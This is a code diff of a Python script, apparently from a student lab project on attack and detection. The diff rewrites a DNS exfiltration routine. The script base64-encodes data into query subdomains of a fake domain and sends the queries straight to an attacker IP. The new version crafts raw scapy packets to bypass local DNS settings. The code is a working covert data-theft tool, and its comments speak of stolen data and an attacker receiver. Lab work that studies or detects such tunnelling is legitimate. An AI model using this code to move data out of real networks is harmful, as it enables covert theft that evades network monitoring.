@@ -1,38 +1,33 @@
 import base64
-import dns.resolver
+from scapy.all import IP, UDP, DNS, DNSQR, send, conf
 
 # --- CONFIGURATION ---
-# The IP address of your Attacker/Detector VM (Kali-FYP1)
-ATTACKER_IP = "10.0.0.5"            
-# The fake domain used to tag the traffic (Must match attacker_receiver.py)
-ATTACKER_DOMAIN = "test.google.com" 
+ATTACKER_IP = "10.0.0.5"
+ATTACKER_DOMAIN = "test.google.com"
+
+# Disable scapy verbosity (stops it from printing "Sent 1 packet" every time)
+conf.verb = 0
 
 def send_data_over_dns(data):
     try:
-        # 1. Encode the data to Base64 (URL-safe)
-        # We strip the '=' padding because '=' is not a valid character in DNS labels.
+        # 1. Encode data to URL-safe Base64
         encoded_data = base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
 
-        # 2. Construct the target domain: <stolen_data>.test.google.com
-        target_domain = f"{encoded_data}.{ATTACKER_DOMAIN}"
+        # 2. Construct DNS query name (e.g., encoded_string.test.google.com.)
+        target_domain = f"{encoded_data}.{ATTACKER_DOMAIN}."
 
-        print(f"[>] Sending Covert DNS to {ATTACKER_IP}: {target_domain}")
+        print(f"[>] Exfiltrating via DNS: {target_domain}")
 
-        # 3. Configure the Resolver to target the Attacker DIRECTLY
-        resolver = dns.resolver.Resolver()
-        
-        # [CRITICAL STEP] 
-        # This tells the script: "Do NOT use the system DNS. Send this packet ONLY to 10.0.0.5"
-        resolver.nameservers = [ATTACKER_IP] 
-        
-        resolver.lifetime = 1 # 1 second timeout (we don't wait long for a reply)
-        resolver.timeout = 1
+        # 3. Craft DNS packet manually
+        # This sends a packet DIRECTLY to 10.0.0.5, bypassing local DNS settings
+        dns_query = IP(dst=ATTACKER_IP) / \
+                    UDP(dport=53) / \
+                    DNS(rd=1, qd=DNSQR(qname=target_domain, qtype="A"))
 
-        # 4. Send the DNS Query (The actual exfiltration)
-        # The Attacker (10.0.0.5) will sniff this packet off the wire.
-        resolver.resolve(target_domain, "A")
+        # 4. Send packet
+        send(dns_query, verbose=False)
 
-    except Exception:
-        # We expect a timeout exception here because 10.0.0.5 is not a real DNS server 
-        # and won't send a valid reply back. This is normal behavior for this attack.
-        pass
+        print(f"[✓] Packet sent to {ATTACKER_IP}")
+
+    except Exception as e:
+        print(f"[!] Error sending DNS: {e}")
